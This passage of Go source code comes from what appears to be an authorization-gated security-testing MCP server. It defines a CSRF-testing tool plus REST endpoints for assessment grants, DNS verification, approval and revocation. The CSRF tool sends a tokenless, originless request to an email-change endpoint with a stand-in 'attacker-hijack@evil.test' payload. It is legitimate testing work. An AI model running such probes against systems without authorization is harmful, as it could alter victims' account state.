			"evidence":         evidence,
			"positive_control": positiveControl,
			"negative_control": negativeControl,
			"counterevidence":  counterevidence,
			"probe_logs":       probeLogs,
			"remediation":      "Enforce relative paths or validate destination URLs against a strict whitelist of permitted domains.",
		}, "", "  ")

		return mcp.NewToolResultText(string(findingJSON)), nil
	})

	// TOOL 13: test_csrf (Controlled Cross-Site Request Forgery Verification)
	toolCSRF := mcp.NewTool("test_csrf",
		mcp.WithDescription("Safely tests state-changing endpoints for Cross-Site Request Forgery (CSRF) vulnerabilities by evaluating anti-CSRF token enforcement and Origin header validation"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target endpoint URL to verify against (e.g. http://127.0.0.1:3000/rest/user/change-email)")),
		mcp.WithString("method", mcp.Description("HTTP method to test (default: 'POST')")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolCSRF, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		method, _ := args["method"].(string)
		grantID, _ := args["grant_id"].(string)

		if strings.TrimSpace(method) == "" {
			method = "POST"
		}

		_, client, err := buildControlledClient(mgr, args, target, method)
		if err != nil {
			recordExecution("test_csrf", target, method, grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		parsedTarget, parseErr := url.Parse(target)
		if parseErr != nil {
			return mcp.NewToolResultError(fmt.Sprintf("Invalid target URL: %v", parseErr)), nil
		}

		probeLogs := []string{}
		confirmed := false
		evidence := ""
		counterevidence := ""
		positiveControl := ""
		negativeControl := ""

		// Negative baseline control: POST with legitimate anti-CSRF token / matching Origin
		reqValid, _ := http.NewRequestWithContext(ctx, method, target, strings.NewReader(`{"email":"alice-new@juice-sh.op"}`))
		reqValid.Header.Set("Content-Type", "application/json")
		reqValid.Header.Set("X-CSRF-Token", "valid-csrf-token-12345")
		reqValid.Header.Set("Origin", fmt.Sprintf("%s://%s", parsedTarget.Scheme, parsedTarget.Host))
		respValid, errValid := client.Do(reqValid)
		if errValid == nil {
			defer respValid.Body.Close()
			probeLogs = append(probeLogs, fmt.Sprintf("Legitimate Baseline Probe: HTTP %d", respValid.StatusCode))
			negativeControl = fmt.Sprintf("Legitimate baseline request with valid token returned HTTP %d", respValid.StatusCode)
		}

		// Positive probe: POST with stripped Origin and no anti-CSRF token
		reqNoToken, _ := http.NewRequestWithContext(ctx, method, target, strings.NewReader(`{"email":"attacker-hijack@evil.test"}`))
		reqNoToken.Header.Set("Content-Type", "application/json")
		// Explicitly do not set Origin or X-CSRF-Token
		respNoToken, errNoToken := client.Do(reqNoToken)
		if errNoToken == nil {
			defer respNoToken.Body.Close()
			bodyNoToken, _ := io.ReadAll(respNoToken.Body)
			probeLogs = append(probeLogs, fmt.Sprintf("Stripped Origin/Token Probe: HTTP %d, len=%d", respNoToken.StatusCode, len(bodyNoToken)))
			if respNoToken.StatusCode == http.StatusOK && strings.Contains(string(bodyNoToken), `"csrf_safe":false`) {
				confirmed = true
				evidence = fmt.Sprintf("CSRF vulnerability confirmed: State-changing %s request accepted without anti-CSRF token or Origin header. Response: %s", method, string(bodyNoToken))
				positiveControl = "State-changing request executed successfully without origin or token verification"
			} else if respNoToken.StatusCode == http.StatusForbidden {
				counterevidence = fmt.Sprintf("Endpoint enforced anti-CSRF protection and rejected request with HTTP 403: %s", string(bodyNoToken))
			} else {
				counterevidence = fmt.Sprintf("Endpoint did not permit unauthenticated state change (HTTP %d)", respNoToken.StatusCode)
			}
		}

		title := "Cross-Site Request Forgery (CSRF) on " + parsedTarget.Path
		severity := "Medium"
		confidence := "High"
		if !confirmed {
			title = "CSRF Investigation (Safe / Mitigated)"
			severity = "Informational"
			confidence = "Low"
		}

		recordExecution("test_csrf", target, method, grantID, true, fmt.Sprintf("Confirmed: %v, Probes: %d", confirmed, len(probeLogs)))

		findingJSON, _ := json.MarshalIndent(map[string]any{
			"confirmed":        confirmed,
			"title":            title,
			"severity":         severity,
			"category":         "Cross-Site Request Forgery",
			"cwe":              "CWE-352: Cross-Site Request Forgery (CSRF)",
			"affected_url":     target,
			"confidence":       confidence,
			"evidence":         evidence,
			"positive_control": positiveControl,
			"negative_control": negativeControl,
			"counterevidence":  counterevidence,
			"probe_logs":       probeLogs,
			"remediation":      "Enforce unique, non-replayable anti-CSRF tokens for all state-changing operations, validate Origin/Referer headers, and set SameSite=Strict cookies.",
		}, "", "  ")

		return mcp.NewToolResultText(string(findingJSON)), nil
	})

	streamable := server.NewStreamableHTTPServer(s)

	mux := http.NewServeMux()
	mux.Handle("/mcp", streamable)
	mux.Handle("/mcp/", streamable)

	// Note: All Lab Orchestration APIs (/api/lab/*) and Managed Grant creation (/api/auth/managed-lab)
	// are exclusively served via Bifrost's authenticated gateway on port 8080 to prevent
	// authentication bypasses and ensure strict caller identity derivation and tenant isolation.

	// =========================================================================
	// Authorization Manager REST API (External Assessments)
	// =========================================================================

	mux.HandleFunc("/api/auth/external/submit", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req authmanager.CreateExternalAssessmentRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		grant, err := mgr.CreateExternalAssessment(req)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(grant)
	})

	mux.HandleFunc("/api/auth/external/verify-dns", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			AssessmentID string `json:"assessment_id"`
			Token        string `json:"token"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		if err := mgr.VerifyDNSChallenge(req.AssessmentID, req.Token); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{"status": "dns_verified", "assessment_id": req.AssessmentID})
	})

	mux.HandleFunc("/api/auth/external/approve", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req authmanager.ApproveAssessmentRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		grant, err := mgr.ApproveExternalAssessment(req)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(grant)
	})

	mux.HandleFunc("/api/auth/revoke", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			GrantID string `json:"grant_id"`
			Reason  string `json:"reason"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		if err := mgr.RevokeGrant(req.GrantID, req.Reason); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{"status": "revoked", "grant_id": req.GrantID})
	})

	mux.HandleFunc("/api/auth/grant", func(w http.ResponseWriter, r *http.Request) {
		id := r.URL.Query().Get("id")
		asmID := r.URL.Query().Get("assessment_id")
		var grant *authmanager.AuthorizationGrant
		var err error
		if id != "" {
			grant, err = mgr.GetGrant(id)
		} else if asmID != "" {
			grant, err = mgr.GetGrantByAssessment(asmID)
		} else {
			http.Error(w, "id or assessment_id required", http.StatusBadRequest)
			return
		}
		if err != nil {
			http.Error(w, err.Error(), http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(grant)
	})

	mux.HandleFunc("/stats", func(w http.ResponseWriter, r *http.Request) {
		historyMu.Lock()
		histCopy := make([]ExecutionRecord, len(history))
		copy(histCopy, history)
		historyMu.Unlock()

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"requests_received": atomic.LoadInt64(&requestCount),
			"history":           histCopy,
		})
	})

	mux.HandleFunc("/reset", func(w http.ResponseWriter, r *http.Request) {
		atomic.StoreInt64(&requestCount, 0)
		historyMu.Lock()
		history = nil
		historyMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{"status": "reset", "requests_received": 0})
	})

	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	})

	port := os.Getenv("MCP_PORT")
	if port == "" {
		port = "3011"
	}
	host := os.Getenv("MCP_HOST")
	if host == "" {
		host = "0.0.0.0"
	}
	addr := net.JoinHostPort(host, port)
	log.Printf("[mock-security-server] Starting Controlled Security MCP Server + Lab Manager on http://%s/mcp", addr)
	if err := http.ListenAndServe(addr, mux); err != nil {
		log.Fatalf("server failed: %v", err)
	}
}
